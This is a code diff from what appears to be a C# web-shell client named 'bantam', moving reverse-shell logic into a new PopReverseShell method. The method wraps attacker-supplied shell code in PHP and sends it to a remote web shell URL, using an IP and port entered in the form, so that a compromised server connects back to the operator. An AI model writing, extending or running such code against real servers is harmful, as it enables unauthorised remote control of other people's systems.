@@ -138,11 +138,25 @@ namespace bantam.Forms
         /// <summary>
         /// 
         /// </summary>
+        /// <param name="shellCode"></param>
+        private async void PopReverseShell(string shellCode)
+        {
+            string phpCode = PhpHelper.ExecuteSystemCode(shellCode, false);
+
+            ResponseObject response = await Task.Run(() => WebHelper.ExecuteRemotePHP(ShellUrl, phpCode, false));
+
+            if (string.IsNullOrEmpty(response.Result) == false) {
+                string result = response.Result;
+            }
+        }
+
+        /// <summary>
+        /// 
+        /// </summary>
         /// <param name="sender"></param>
         /// <param name="e"></param>
         private async void btnPopShell_Click(object sender, EventArgs e)
         {
-            //btnPopShell.Enabled = false;
             string shellCode = string.Empty;
             string ip = Helper.MinifyCode(textBoxIP.Text);
             string port = textBoxPort.Text;
@@ -170,18 +184,6 @@ namespace bantam.Forms
 
                     break;
             }
-
-            //shellCode = shellCode.Replace("\"", "FUCK");
-
-            string phpCode = PhpHelper.ExecuteSystemCode(shellCode, false);
-
-            ResponseObject response = await Task.Run(() => WebHelper.ExecuteRemotePHP(ShellUrl, phpCode, false));
-
-            if (string.IsNullOrEmpty(response.Result) == false) {
-                string result = response.Result;
-            }
-
-            //btnPopShell.Enabled = true;
         }
 
         private async void buttonGetIpv4_Click(object sender, EventArgs e)
